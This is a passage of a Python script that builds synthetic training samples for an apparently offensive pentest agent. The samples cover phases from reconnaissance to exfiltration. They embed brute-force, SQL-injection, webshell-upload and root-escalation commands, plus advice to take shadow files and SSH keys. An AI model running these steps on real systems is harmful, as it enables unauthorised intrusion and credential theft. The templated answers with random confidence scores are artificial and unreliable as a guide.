                        missing.append("service enumeration")
                        sufficient = False
                elif phase == "PRIVILEGE_ESCALATION":
                    if not ev["shells"]:
                        missing.append("initial shell access")
                        sufficient = False
                elif phase == "LATERAL_MOVEMENT":
                    if not ev["shells"]:
                        missing.append("shell access on current host")
                        sufficient = False
                    if not ev["credentials"]:
                        missing.append("credentials for lateral movement")
                        sufficient = False
                elif phase == "POST_EXPLOITATION":
                    if not ev["shells"]:
                        missing.append("shell access")
                        sufficient = False
                elif phase == "EXFILTRATION":
                    if not ev["files"] and not ev["credentials"]:
                        missing.append("sensitive data or files to exfiltrate")
                        sufficient = False

                confidence = 0.9 if sufficient else 0.3
                recommendation = (
                    f"Proceed with {PHASE_OBJECTIVES.get(phase, 'phase objectives')[:60]}"
                    if sufficient else
                    f"First obtain: {', '.join(missing)}"
                )

                response = json.dumps({
                    "sufficient": sufficient,
                    "missing": missing,
                    "confidence": round(confidence, 2),
                    "recommendation": recommendation,
                })

                samples.append(Sample(
                    task="evidence_check",
                    messages=[
                        {"role": "system", "content": _sys("evidence_check", agent)},
                        {"role": "user", "content": f"Is the evidence sufficient to proceed?\n\nTransition: {prev_phase} -> {phase}\n\n{ctx}"},
                        {"role": "assistant", "content": response},
                    ],
                    metadata={"from_phase": prev_phase, "to_phase": phase, "sufficient": sufficient, "agent": agent, "source": fname},
                    quality=0.7 + (0.2 if missing else 0),
                ))

            # Also generate mid-phase evidence checks (every 5 steps)
            if i > 0 and i % 5 == 0:
                ev = build_evidence_snapshot(steps, i)
                ctx = build_context_str(step, steps, i)
                agent = "BlueAgent"

                missing = []
                sufficient = True

                if phase == "RECON" and i > 8 and not ev["ports"]:
                    missing.append("open ports — scanning may need different approach")
                    sufficient = False
                elif phase == "ENUMERATION" and i > 15 and not ev["services"]:
                    missing.append("service identification — try targeted version scans")
                    sufficient = False
                elif phase == "EXPLOITATION" and i > 25 and not ev["shells"]:
                    missing.append("initial access — may need to revisit enumeration")
                    sufficient = False

                if missing:
                    response = json.dumps({
                        "sufficient": False,
                        "missing": missing,
                        "confidence": 0.4,
                        "recommendation": f"Stagnation detected in {phase} — {missing[0]}",
                    })

                    samples.append(Sample(
                        task="evidence_check",
                        messages=[
                            {"role": "system", "content": _sys("evidence_check", agent)},
                            {"role": "user", "content": f"Progress check — is evidence on track?\n\nPhase: {phase}\nStep: {i}\n\n{ctx}"},
                            {"role": "assistant", "content": response},
                        ],
                        metadata={"from_phase": phase, "to_phase": phase, "sufficient": False, "stagnation_check": True, "agent": agent, "source": fname},
                        quality=0.8,
                    ))

            prev_phase = phase
    return samples


# ══════════════════════════════════════════════════════════════════════════════
# KNOWLEDGE CORPUS GENERATORS — NEW IN V3
# ══════════════════════════════════════════════════════════════════════════════

def gen_knowledge_evidence_check(knowledge: list[dict]) -> list[Sample]:
    """Generate evidence_check samples from knowledge corpus evidence_gate fields."""
    samples = []

    for entry in knowledge:
        title = entry.get("title", "")
        taxonomy_raw = entry.get("taxonomy", "")
        evidence_raw = entry.get("evidence_gate", "")

        if not evidence_raw or not title:
            continue

        # Parse stringified dicts
        try:
            if isinstance(taxonomy_raw, str):
                taxonomy = ast.literal_eval(taxonomy_raw)
            else:
                taxonomy = taxonomy_raw
            if isinstance(evidence_raw, str):
                evidence_gate = ast.literal_eval(evidence_raw)
            else:
                evidence_gate = evidence_raw
        except (ValueError, SyntaxError):
            continue

        prereqs = evidence_gate.get("prerequisites", [])
        phase_fit = taxonomy.get("phase_fit", [])
        confidence = evidence_gate.get("confidence", 0.5)

        if not prereqs or not phase_fit:
            continue

        target = _rand_ip()
        phase = random.choice(phase_fit) if phase_fit else "EXPLOITATION"
        agent = _pick_agent(phase, "evidence_check")

        # Generate sufficient scenario
        sufficient_state = f"Phase: {phase}\nTarget: {target}\n"
        has_items = []
        for p in prereqs:
            if "shell" in p:
                sufficient_state += "Shells: user@target\n"
                has_items.append("shell access")
            elif "port" in p:
                sufficient_state += "Ports: 22, 80, 445\n"
                has_items.append("port discovery")
            elif "service" in p:
                sufficient_state += "Services: OpenSSH 8.2, Apache 2.4\n"
                has_items.append("service identification")
            elif "credential" in p:
                sufficient_state += "Credentials: admin:password\n"
                has_items.append("credential(s)")

        if has_items:
            response = json.dumps({
                "sufficient": True,
                "missing": [],
                "confidence": round(min(0.95, confidence + 0.2), 2),
                "recommendation": f"Prerequisites met ({', '.join(has_items)}) — proceed with {title[:60]}",
            })

            samples.append(Sample(
                task="evidence_check",
                messages=[
                    {"role": "system", "content": _sys("evidence_check", agent)},
                    {"role": "user", "content": f"Is evidence sufficient for: {title}?\n\n{sufficient_state}"},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": phase, "knowledge_title": title[:80], "sufficient": True, "agent": agent, "source": "knowledge"},
                quality=0.85,
            ))

        # Generate insufficient scenario
        insufficient_state = f"Phase: {phase}\nTarget: {target}\n"
        missing_items = []
        for p in prereqs:
            if "shell" in p:
                missing_items.append("shell access on target")
            elif "service" in p:
                missing_items.append("service identification")

        if missing_items:
            response = json.dumps({
                "sufficient": False,
                "missing": missing_items[:3],
                "confidence": round(max(0.2, confidence - 0.3), 2),
                "recommendation": f"Cannot proceed with {title[:40]} — need {missing_items[0]}",
            })

            samples.append(Sample(
                task="evidence_check",
                messages=[
                    {"role": "system", "content": _sys("evidence_check", agent)},
                    {"role": "user", "content": f"Is evidence sufficient for: {title}?\n\n{insufficient_state}No shells. No credentials."},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": phase, "knowledge_title": title[:80], "sufficient": False, "agent": agent, "source": "knowledge"},
                quality=0.85,
            ))

    return samples


def gen_knowledge_retrieval_reasoning(knowledge: list[dict], postmortems: list[dict]) -> list[Sample]:
    """Generate retrieval_reasoning by combining knowledge + scenarios."""
    samples = []
    rng = random.Random(SEED)

    # Group knowledge by phase
    by_phase: dict[str, list[dict]] = {}
    for entry in knowledge:
        taxonomy_raw = entry.get("taxonomy", "")
        try:
            taxonomy = ast.literal_eval(taxonomy_raw) if isinstance(taxonomy_raw, str) else taxonomy_raw
        except (ValueError, SyntaxError):
            continue
        for phase in taxonomy.get("phase_fit", []):
            by_phase.setdefault(phase, []).append(entry)

    # Generate samples by combining current state + knowledge memory
    scenarios = [
        {"phase": "RECON", "ports": "22, 80", "services": "", "state_desc": "Initial scan shows SSH and HTTP"},
        {"phase": "RECON", "ports": "21, 22, 80", "services": "vsFTPd 3.0.3", "state_desc": "FTP, SSH and HTTP discovered"},
        {"phase": "ENUMERATION", "ports": "22, 80, 443, 3306", "services": "Apache 2.4, MySQL 5.7, OpenSSH 8.2", "state_desc": "Multiple services identified"},
        {"phase": "ENUMERATION", "ports": "22, 80, 139, 445", "services": "Apache, Samba 3.0.20, OpenSSH", "state_desc": "SMB service found — potential lateral movement"},
        {"phase": "EXPLOITATION", "ports": "22, 80", "services": "Werkzeug/1.0.1", "state_desc": "Python web framework with potential debug endpoint"},
        {"phase": "EXPLOITATION", "ports": "21, 22, 80", "services": "vsftpd 2.3.4, OpenSSH, Apache", "state_desc": "Known vulnerable FTP service detected"},
        {"phase": "PRIVILEGE_ESCALATION", "ports": "", "services": "", "state_desc": "User shell obtained, looking for escalation vectors",
         "extra": "Shells: user@target\nSUID: /usr/bin/python3.8 with cap_setuid"},
        {"phase": "PRIVILEGE_ESCALATION", "ports": "", "services": "", "state_desc": "User shell obtained, sudo misconfiguration possible",
         "extra": "Shells: www-data@target\nsudo -l shows: (ALL) NOPASSWD: /usr/bin/vim"},
        {"phase": "LATERAL_MOVEMENT", "ports": "22, 445", "services": "SMB, SSH", "state_desc": "Root on first host, credentials available",
         "extra": "Shells: root@10.10.10.5\nCredentials: admin:password123"},
        {"phase": "POST_EXPLOITATION", "ports": "", "services": "", "state_desc": "Root access achieved, searching for flags",
         "extra": "Shells: root@target\nFlags found: user.txt"},
    ]

    for scenario in scenarios:
        phase = scenario["phase"]
        knowledge_for_phase = by_phase.get(phase, [])
        if not knowledge_for_phase:
            continue

        # Pick up to 5 knowledge entries per scenario
        selected = rng.sample(knowledge_for_phase, min(5, len(knowledge_for_phase)))

        for entry in selected:
            title = entry.get("title", "")
            summary = entry.get("summary", "")
            if not summary or len(summary) < 20:
                continue
            # Clean markdown artifacts
            summary = re.sub(r"\{\{#include[^}]*\}\}", "", summary).strip()
            if not summary:
                continue

            target = _rand_ip()
            agent = _pick_agent(phase, "retrieval_reasoning")

            state_parts = [f"Phase: {phase}", f"Target: {target}"]
            if scenario["ports"]:
                state_parts.append(f"Ports: {scenario['ports']}")
            if scenario["services"]:
                state_parts.append(f"Services: {scenario['services']}")
            if scenario.get("extra"):
                state_parts.append(scenario["extra"])
            state_str = "\n".join(state_parts)

            # Extract actionable command from knowledge
            exec_raw = entry.get("execution", "")
            try:
                execution = ast.literal_eval(exec_raw) if isinstance(exec_raw, str) else exec_raw
            except (ValueError, SyntaxError):
                execution = {}

            templates = execution.get("command_templates", [])
            raw_raw = entry.get("raw_preservation", "")
            try:
                raw_pres = ast.literal_eval(raw_raw) if isinstance(raw_raw, str) else raw_raw
            except (ValueError, SyntaxError):
                raw_pres = {}
            original_cmds = raw_pres.get("original_commands", [])

            action_cmd = ""
            if original_cmds and isinstance(original_cmds[0], dict):
                action_cmd = original_cmds[0].get("command", "")[:150]
            elif original_cmds and isinstance(original_cmds[0], str):
                action_cmd = original_cmds[0][:150]
            elif templates:
                action_cmd = templates[0] if isinstance(templates[0], str) else str(templates[0])[:100]

            if not action_cmd:
                action_cmd = f"# Investigate: {title[:80]}"

            action_cmd = action_cmd.replace("{target_ip}", target)

            from_memory = summary[:200]
            from_current = scenario["state_desc"]

            synthesis = f"{from_current}. Prior knowledge suggests: {from_memory[:100]}. "
            if "vuln" in title.lower() or "exploit" in title.lower():
                synthesis += "Known vulnerability may provide direct access."
            elif "privesc" in title.lower() or "escalat" in title.lower():
                synthesis += "Escalation technique applicable to current shell."
            else:
                synthesis += "Technique aligns with current phase objectives."

            response = json.dumps({
                "synthesis": synthesis[:250],
                "from_current": from_current[:150],
                "from_memory": from_memory[:200],
                "action": action_cmd[:200],
                "confidence": round(rng.uniform(0.6, 0.95), 2),
            })

            samples.append(Sample(
                task="retrieval_reasoning",
                messages=[
                    {"role": "system", "content": _sys("retrieval_reasoning", agent)},
                    {"role": "user", "content": (
                        f"Current state:\n{state_str}\n\n"
                        f"Prior experience: {from_memory[:200]}\n\n"
                        f"Synthesize guidance."
                    )},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": phase, "knowledge_title": title[:80], "agent": agent, "source": "knowledge_retrieval"},
                quality=0.88,
            ))

    # Also generate from postmortem skill_cards
    for pm in postmortems[:500]:
        skills = pm.get("skill_cards", [])
        outcomes = pm.get("key_outcomes", {})
        if not skills:
            continue

        for skill in skills[:2]:
            if_cond = skill.get("if_condition", "")
            then_act = skill.get("then_action", "")
            if not if_cond or not then_act:
                continue

            target = _rand_ip()
            phase = rng.choice(["RECON", "ENUMERATION", "EXPLOITATION", "PRIVILEGE_ESCALATION"])
            agent = _pick_agent(phase, "retrieval_reasoning")

            state = f"Phase: {phase}\nTarget: {target}\nStep: {rng.randint(5, 80)}"
            if outcomes.get("summary"):
                memory = f"Previous engagement lesson: When {if_cond}, then {then_act}. Context: {outcomes['summary'][:100]}"
            else:
                memory = f"Learned pattern: When {if_cond}, then {then_act}"

            response = json.dumps({
                "synthesis": f"Applying learned pattern: {if_cond[:80]} -> {then_act[:80]}",
                "from_current": f"{phase} phase at step — checking if pattern applies",
                "from_memory": memory[:200],
                "action": then_act[:150],
                "confidence": round(rng.uniform(0.65, 0.9), 2),
            })

            samples.append(Sample(
                task="retrieval_reasoning",
                messages=[
                    {"role": "system", "content": _sys("retrieval_reasoning", agent)},
                    {"role": "user", "content": f"Current state:\n{state}\n\nPrior experience: {memory[:200]}\n\nSynthesize guidance."},
                    {"role": "assistant", "content": response},
                ],
                metadata={"phase": phase, "skill_pattern": if_cond[:50], "agent": agent, "source": "postmortem_skill"},
                quality=0.85,
            ))

    return samples


def gen_knowledge_next_step(knowledge: list[dict]) -> list[Sample]:
    """Generate next_step samples from knowledge corpus — privesc, techniques, services."""
    samples = []
    rng = random.Random(SEED + 1)

    for entry in knowledge:
        title = entry.get("title", "")
        summary = entry.get("summary", "")
        taxonomy_raw = entry.get("taxonomy", "")
        exec_raw = entry.get("execution", "")
        raw_raw = entry.get("raw_preservation", "")

        if not title or not summary:
            continue

        try:
            taxonomy = ast.literal_eval(taxonomy_raw) if isinstance(taxonomy_raw, str) else taxonomy_raw
            execution = ast.literal_eval(exec_raw) if isinstance(exec_raw, str) else exec_raw
            raw_pres = ast.literal_eval(raw_raw) if isinstance(raw_raw, str) else raw_raw
        except (ValueError, SyntaxError):
            continue

        phase_fit = taxonomy.get("phase_fit", [])
        if not phase_fit:
            continue

        # Extract command
        original_cmds = raw_pres.get("original_commands", [])
        cmd = ""
        if original_cmds:
            first = original_cmds[0]
            if isinstance(first, dict):
                cmd = first.get("command", "")
            elif isinstance(first, str):
                cmd = first
        if not cmd:
            templates = execution.get("command_templates", [])
            if templates and isinstance(templates[0], str):
                cmd = templates[0]

        if not cmd or len(cmd) < 5:
            continue

        # Clean markdown from summary
        summary = re.sub(r"\{\{#include[^}]*\}\}", "", summary).strip()
        summary = re.sub(r"```\w*\n?", "", summary)
        summary = summary.strip()
        if not summary or len(summary) < 10:
            continue

        target = _rand_ip()
        phase = rng.choice(phase_fit)
        agent = _pick_agent(phase, "next_step")
        cmd = cmd.replace("{target_ip}", target)[:200]

        # Build context
        ctx_parts = [f"Phase: {phase}", f"Target: {target}", f"Step: {rng.randint(5, 80)}"]

        if phase in ("EXPLOITATION", "PRIVILEGE_ESCALATION"):
            ctx_parts.append("Shells: user@target")
        if phase in ("ENUMERATION", "EXPLOITATION"):
            ctx_parts.append("Ports: 22, 80, 445")
            ctx_parts.append("Services: OpenSSH 8.2, Apache 2.4.41")

        # Limit reasoning to tactical justification
        reasoning = summary[:150]
        if "privesc" in title.lower() or "privilege" in title.lower():
            reasoning = f"Privilege escalation via {title.split(':')[-1].strip()[:80]}"
        elif "htb" in title.lower():
            reasoning = f"Known attack pattern: {title[:80]}"
        elif "mitre" in title.lower():
            reasoning = f"ATT&CK technique {title.split(':')[-1].strip()[:80]}"

        phase_fit_score = min(1.0, rng.uniform(0.7, 0.98))

        response = json.dumps({
            "action": cmd[:200],
            "reasoning": reasoning[:200],
            "phase_fit": round(phase_fit_score, 2),
            "alternatives": [],
        })

        samples.append(Sample(
            task="next_step",
            messages=[
                {"role": "system", "content": _sys("next_step", agent)},
                {"role": "user", "content": f"Current engagement state:\n" + "\n".join(ctx_parts) + "\n\nSuggest the next action."},
                {"role": "assistant", "content": response},
            ],
            metadata={"phase": phase, "knowledge_title": title[:80], "agent": agent, "source": "knowledge_next_step"},
            quality=0.82,
        ))

    return samples


# ══════════════════════════════════════════════════════════════════════════════
# MASSIVE SYNTHETIC GENERATORS
# ══════════════════════════════════════════════════════════════════════════════

def gen_synthetic_tool_outputs() -> list[Sample]:
    """Synthetic: diverse tool output parsing samples."""
    templates = [
        # Nmap full scan
        {"input": "Command: nmap -sV -sC -p- {ip}\n\nOutput:\nPORT     STATE SERVICE      VERSION\n21/tcp   open  ftp          vsftpd 3.0.3\n22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.5\n80/tcp   open  http         Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Site doesn't have a title\n3306/tcp open  mysql        MySQL 5.7.38\n| mysql-info: Protocol: 10\nService Info: OS: Unix",
         "output": {"discoveries": [
             {"type": "port", "value": "21/tcp ftp open", "confidence": 0.99},
             {"type": "service", "value": "vsftpd 3.0.3", "confidence": 0.99},
             {"type": "port", "value": "22/tcp ssh open", "confidence": 0.99},
             {"type": "service", "value": "OpenSSH 8.2p1 Ubuntu", "confidence": 0.99},
             {"type": "port", "value": "80/tcp http open", "confidence": 0.99},
             {"type": "service", "value": "Apache httpd 2.4.41", "confidence": 0.99},
             {"type": "port", "value": "3306/tcp mysql open", "confidence": 0.99},
             {"type": "service", "value": "MySQL 5.7.38", "confidence": 0.99},
         ], "phase_impact": "advance", "summary": "Found 4 open ports with versioned services: FTP, SSH, HTTP, MySQL"}},
        # Gobuster
        {"input": "Command: gobuster dir -u http://{ip} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html\n\nOutput:\n/index.html           (Status: 200) [Size: 10918]\n/images               (Status: 301) [Size: 313]\n/uploads              (Status: 301) [Size: 314]\n/admin                (Status: 301) [Size: 312]\n/config.php           (Status: 200) [Size: 0]\n/robots.txt           (Status: 200) [Size: 26]\n/server-status        (Status: 403) [Size: 277]",
         "output": {"discoveries": [
             {"type": "file", "value": "/admin (directory, 301)", "confidence": 0.95},
             {"type": "file", "value": "/uploads (directory, writable?)", "confidence": 0.85},
             {"type": "file", "value": "/config.php (empty — may be include-only)", "confidence": 0.8},
             {"type": "file", "value": "/robots.txt (may contain hidden paths)", "confidence": 0.9},
         ], "phase_impact": "stay", "summary": "Web directory enumeration found admin panel, uploads directory, and config file"}},
        # SMB enumeration
        {"input": "Command: enum4linux -a {ip}\n\nOutput:\n[+] Server {ip} allows sessions using username '', password ''\n[+] Got domain/workgroup name: WORKGROUP\n[+] Password Info for Domain: WORKGROUP\n[+] Users on {ip}:\nuser:[admin] rid:[0x3e8]\nuser:[backup] rid:[0x3e9]\n[+] Share Enumeration on {ip}\n//10.10.10.5/tmp        Mapping: OK  Listing: OK\n//10.10.10.5/opt        Mapping: DENIED  Listing: N/A\n//10.10.10.5/IPC$       [E] Listing: N/A",
         "output": {"discoveries": [
             {"type": "credential", "value": "anonymous SMB access (null session)", "confidence": 0.95},
             {"type": "user", "value": "admin (rid:0x3e8)", "confidence": 0.95},
             {"type": "user", "value": "backup (rid:0x3e9)", "confidence": 0.95},
             {"type": "file", "value": "//target/tmp share accessible", "confidence": 0.9},
         ], "phase_impact": "advance", "summary": "Null SMB session reveals 2 users (admin, backup) and accessible tmp share"}},
        # SQLmap
        {"input": "Command: sqlmap -u 'http://{ip}/login.php?id=1' --batch --dbs\n\nOutput:\n[INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL >= 5.0\n[INFO] fetching database names\navailable databases [3]:\n[*] information_schema\n[*] mysql\n[*] webapp\n\nsqlmap identified the following injection point(s):\nParameter: id (GET)\n    Type: boolean-based blind\n    Type: time-based blind\n    Type: UNION query",
         "output": {"discoveries": [
             {"type": "vuln", "value": "SQL injection on /login.php?id= (boolean, time, UNION)", "confidence": 0.99},
             {"type": "service", "value": "MySQL >= 5.0 backend", "confidence": 0.95},
         ], "phase_impact": "advance", "summary": "Confirmed SQL injection with 3 injection types — database 'webapp' discovered"}},
        # LinPEAS privilege escalation
        {"input": "Command: ./linpeas.sh\n\nOutput (relevant sections):\n╔══════════╣ Checking sudo privileges\nUser www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/env\n\n╔══════════╣ SUID\n-rwsr-xr-x 1 root root 44680 /usr/bin/passwd\n-rwsr-xr-x 1 root root 26424 /usr/bin/newgrp\n-rwsr-sr-x 1 root root 14648 /usr/bin/python3.8\n\n╔══════════╣ Capabilities\n/usr/bin/python3.8 = cap_setuid+ep\n\n╔══════════╣ Interesting Files - /etc/shadow\n-rw-r----- 1 root shadow 1.2K /etc/shadow (readable by shadow group)",
         "output": {"discoveries": [
             {"type": "vuln", "value": "sudo NOPASSWD: /usr/bin/env (direct root via env /bin/sh -p)", "confidence": 0.99},
             {"type": "vuln", "value": "python3.8 SUID + cap_setuid (root via os.setuid(0))", "confidence": 0.98},
             {"type": "vuln", "value": "/etc/shadow readable by shadow group", "confidence": 0.85},
         ], "phase_impact": "advance", "summary": "Multiple root escalation paths: sudo env (guaranteed), python3 cap_setuid, shadow file readable"}},
        # Hydra SSH brute force
        {"input": "Command: hydra -l admin -P /usr/share/wordlists/rockyou.txt {ip} ssh -t 4\n\nOutput:\n[DATA] attacking ssh://{ip}:22/\n[22][ssh] host: {ip}   login: admin   password: letmein\n[STATUS] 1 valid password found\n1 of 1 target successfully completed",
         "output": {"discoveries": [
             {"type": "credential", "value": "admin:letmein (SSH)", "confidence": 0.99},
         ], "phase_impact": "advance", "summary": "SSH credentials found via brute force: admin/letmein"}},
        # Nikto web scanner
        {"input": "Command: nikto -h http://{ip}\n\nOutput:\n+ Server: Apache/2.4.41\n+ /: The anti-clickjacking X-Frame-Options header is not present.\n+ /: Uncommon header 'x-debug-token' found\n+ /config.php: PHP Config file found\n+ /phpmyadmin/: phpMyAdmin directory found\n+ /backup/: Directory listing enabled\n+ /cgi-bin/test.cgi: Possible CGI test file found\n+ OSVDB-3233: /icons/README: Apache default file found\n+ /shell.php: Possible webshell found",
         "output": {"discoveries": [
             {"type": "file", "value": "/phpmyadmin/ (database management interface)", "confidence": 0.95},
             {"type": "file", "value": "/backup/ (directory listing enabled)", "confidence": 0.95},
             {"type": "vuln", "value": "/shell.php possible webshell", "confidence": 0.8},
             {"type": "file", "value": "/config.php (PHP configuration)", "confidence": 0.9},
             {"type": "vuln", "value": "x-debug-token header (debug mode enabled)", "confidence": 0.7},
         ], "phase_impact": "advance", "summary": "Critical findings: phpMyAdmin, backup directory, possible webshell, debug mode"}},
        # Nmap script scan for specific vuln
        {"input": "Command: nmap --script smb-vuln* -p 445 {ip}\n\nOutput:\nHOST SCRIPT RESULTS:\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1\n|     State: VULNERABLE\n|     Risk factor: HIGH\n|     CVE: CVE-2017-0144\n|   smb-vuln-ms08-067:\n|     State: NOT VULNERABLE",
         "output": {"discoveries": [
             {"type": "vuln", "value": "MS17-010 EternalBlue (CVE-2017-0144) — SMBv1 RCE", "confidence": 0.99},
         ], "phase_impact": "advance", "summary": "Critical: EternalBlue (MS17-010) vulnerability confirmed on SMB port 445"}},
        # WPScan WordPress
        {"input": "Command: wpscan --url http://{ip}/blog/ --enumerate u,p,t\n\nOutput:\n[+] WordPress version 5.7.2 identified\n[i] User(s) Identified:\n[+] admin\n[+] editor\n[+] Plugins:\n[+] wp-file-manager 6.7 (vulnerable: CVE-2020-25213)\n[+] Theme: flavor (outdated version)",
         "output": {"discoveries": [
             {"type": "service", "value": "WordPress 5.7.2", "confidence": 0.99},
             {"type": "user", "value": "admin (WordPress user)", "confidence": 0.95},
             {"type": "user", "value": "editor (WordPress user)", "confidence": 0.95},
             {"type": "vuln", "value": "wp-file-manager 6.7 CVE-2020-25213 (RCE)", "confidence": 0.98},
         ], "phase_impact": "advance", "summary": "WordPress with vulnerable file-manager plugin (CVE-2020-25213 RCE) and 2 users identified"}},
        # tshark PCAP analysis
        {"input": "Command: tshark -r capture.pcap -Y 'ftp || http.request' -T fields -e ip.src -e ip.dst -e ftp.request.command -e ftp.request.arg -e http.request.uri\n\nOutput:\n10.10.10.5\t10.10.10.1\tUSER\tnathan\n10.10.10.5\t10.10.10.1\tPASS\tBuck3tH4TF0RM3!\n10.10.10.5\t10.10.10.1\tRETR\tnotes.txt\n10.10.10.1\t10.10.10.5\t\t\t/admin/dashboard\n10.10.10.1\t10.10.10.5\t\t\t/api/v1/users",
         "output": {"discoveries": [
             {"type": "credential", "value": "nathan:Buck3tH4TF0RM3! (FTP cleartext)", "confidence": 0.99},
             {"type": "file", "value": "notes.txt transferred via FTP", "confidence": 0.9},
             {"type": "file", "value": "/admin/dashboard (HTTP request observed)", "confidence": 0.8},
             {"type": "file", "value": "/api/v1/users (API endpoint)", "confidence": 0.8},
         ], "phase_impact": "advance", "summary": "PCAP reveals FTP credentials (nathan) and admin/API endpoints"}},
    ]

    samples = []
    for t in templates:
        for ip_suffix in range(1, 21):  # Generate 20 variants per template
            ip = _rand_ip()
            inp = t["input"].replace("{ip}", ip)
            out = json.loads(json.dumps(t["output"]))  # deep copy
            agent = _pick_agent("ENUMERATION", "tool_output_parse")

            response = json.dumps(out)

            samples.append(Sample(
                task="tool_output_parse",
                messages=[
                    {"role": "system", "content": _sys("tool_output_parse", agent)},
                    {"role": "user", "content": inp},
                    {"role": "assistant", "content": response},
                ],
                metadata={"synthetic": True, "agent": agent, "source": "synthetic_tool_output"},
                quality=0.95,
            ))
    return samples


def gen_synthetic_evidence_checks() -> list[Sample]:
    """Massive synthetic evidence_check covering all phase transitions and edge cases."""
    samples = []
    rng = random.Random(SEED + 2)

    # All phase transitions with multiple evidence states
    evidence_scenarios = {
        ("RECON", "ENUMERATION"): [
            {"sufficient": True, "evidence": "Ports: 22, 80, 443, 3306\nHost alive confirmed", "missing": [], "rec": "Begin service version detection on 4 discovered ports"},
            {"sufficient": True, "evidence": "Ports: 21, 22, 80\nServices: vsFTPd detected", "missing": [], "rec": "Service partially enumerated — deep scan all ports"},
            {"sufficient": False, "evidence": "No ports discovered\nPing returns no response", "missing": ["open ports — target may be filtered or offline"], "rec": "Try alternative scanning: -Pn flag, UDP scan, or different source port"},
            {"sufficient": False, "evidence": "Only port 22 open\nFiltered: 997 ports", "missing": ["web or application ports — extremely limited attack surface"], "rec": "Attempt UDP scan and investigate SSH version for known vulns"},
        ],
        ("ENUMERATION", "EXPLOITATION"): [
            {"sufficient": True, "evidence": "Ports: 22, 80, 445\nServices: Apache 2.4.49 (CVE-2021-41773 path traversal)\nVulns: path traversal confirmed", "missing": [], "rec": "Exploit Apache path traversal for initial access"},
            {"sufficient": True, "evidence": "Credentials: admin:admin (MySQL)\nServices: phpMyAdmin accessible", "missing": [], "rec": "Use phpMyAdmin with discovered credentials to upload webshell"},
            {"sufficient": False, "evidence": "Ports: 22, 80\nServices: nginx 1.21\nNo credentials. No vulns confirmed.", "missing": ["confirmed vulnerability or valid credentials"], "rec": "Continue enumeration: check for hidden paths, default credentials, version-specific CVEs"},
            {"sufficient": False, "evidence": "Services: OpenSSH 8.9\nNo web service\nNo vulnerabilities found", "missing": ["exploitable vulnerability", "additional services"], "rec": "SSH-only target — attempt credential brute-force or look for SSH key exposure"},
        ],
        ("EXPLOITATION", "PRIVILEGE_ESCALATION"): [
            {"sufficient": True, "evidence": "Shells: www-data@target\nLinPEAS: SUID python3, cap_setuid", "missing": [], "rec": "Exploit python3 cap_setuid for immediate root escalation"},
            {"sufficient": True, "evidence": "Shells: user@target\nsudo -l: (ALL) NOPASSWD: /usr/bin/vim", "missing": [], "rec": "Use vim sudo to escalate: sudo vim -c ':!/bin/bash'"},
            {"sufficient": False, "evidence": "SQL injection confirmed but no shell obtained\nDatabase access only", "missing": ["shell access on target system"], "rec": "Convert SQL injection to shell: INTO OUTFILE webshell, xp_cmdshell, or UDF"},
            {"sufficient": False, "evidence": "Shells: www-data@target\nNo SUID, no sudo, no capabilities", "missing": ["escalation vector (SUID, sudo, capabilities, cron, writable scripts)"], "rec": "Run full enumeration: linpeas, check cron, find writable system files, check kernel version"},
        ],
        ("PRIVILEGE_ESCALATION", "POST_EXPLOITATION"): [
            {"sufficient": True, "evidence": "Shells: root@target\nFull system access", "missing": [], "rec": "Capture flags, extract credentials, check for lateral movement opportunities"},
            {"sufficient": False, "evidence": "Shells: user@target (non-root)\nEscalation failed — kernel not vulnerable", "missing": ["root or elevated access"], "rec": "Try alternative escalation: check docker group, lxd group, NFS root_squash misconfiguration"},
        ],
        ("POST_EXPLOITATION", "EXFILTRATION"): [
            {"sufficient": True, "evidence": "Shells: root@target\nFlags: user.txt found\nFiles: /etc/shadow, SSH keys", "missing": [], "rec": "Exfiltrate flags, shadow file, and SSH keys for documentation"},
            {"sufficient": False, "evidence": "Shells: root@target\nNo flags found in standard locations", "missing": ["flag files or proof of compromise"], "rec": "Search non-standard locations: find / -name '*.txt' -o -name 'flag*' -o -name 'proof*'"},
        ],
    }

    for (from_phase, to_phase), scenarios in evidence_scenarios.items():
        for scenario in scenarios:
            for _ in range(rng.randint(6, 15)):  # Multiple IP variants
                target = _rand_ip()
                agent = _pick_agent(to_phase, "evidence_check")
                step = rng.randint(5, 90)

                state = f"Phase: {from_phase}\nTarget: {target}\nStep: {step}\n{scenario['evidence']}"

                response = json.dumps({
                    "sufficient": scenario["sufficient"],
                    "missing": scenario["missing"],
                    "confidence": round(0.9 if scenario["sufficient"] else rng.uniform(0.2, 0.5), 2),
                    "recommendation": scenario["rec"],
                })

                samples.append(Sample(
                    task="evidence_check",
                    messages=[
                        {"role": "system", "content": _sys("evidence_check", agent)},
                        {"role": "user", "content": f"Is the evidence sufficient to proceed?\n\nTransition: {from_phase} -> {to_phase}\n\n{state}"},
                        {"role": "assistant", "content": response},
                    ],
                    metadata={"from_phase": from_phase, "to_phase": to_phase, "sufficient": scenario["sufficient"],
                              "synthetic": True, "agent": agent, "source": "synthetic_evidence"},
                    quality=0.92,
                ))

    return samples


def gen_synthetic_retry_pivot() -> list[Sample]:
    """Synthetic retry/pivot scenarios for diverse failure recovery."""
    samples = []
    rng = random.Random(SEED + 3)

    scenarios = [
        {"prev_cmd": "gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt", "prev_reward": 0.0,
         "decision": "PIVOT", "next_cmd": "ffuf -u http://{ip}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc 200,301,302",
         "reasoning": "Gobuster with common.txt found nothing — switching to ffuf with larger wordlist and status code filtering"},
        {"prev_cmd": "hydra -l admin -P rockyou.txt {ip} ssh -t 4", "prev_reward": -1.0,
         "decision": "ESCALATE", "next_cmd": "searchsploit openssh 8.2",
         "reasoning": "SSH brute force failed — escalating to exploit search for the specific OpenSSH version"},
        {"prev_cmd": "nmap -sV -p 80 {ip}", "prev_reward": 0.5,
